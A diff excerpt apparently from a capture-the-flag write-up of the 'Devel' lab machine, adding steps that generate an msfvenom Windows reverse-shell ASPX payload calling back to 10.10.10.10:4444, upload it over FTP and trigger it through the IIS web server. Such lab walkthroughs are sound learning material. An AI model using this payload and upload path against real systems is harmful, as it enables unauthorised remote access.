@@ -17,6 +17,14 @@ Find out that FTP & WEB server is on the same path therefore if we upload a shel
 
 ![Devel_web](https://user-images.githubusercontent.com/55708909/91413962-7b88e280-e869-11ea-87fc-fcb94663eeca.png)
 
+Since it is IIS7 I guess we can upload a payload in ASP OR ASPX
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > shell.aspx
+
+Then login in through FTP Server put it & execute it through WEB Server
+
+Here we have a reverse shell from target machine
+
 
 
 
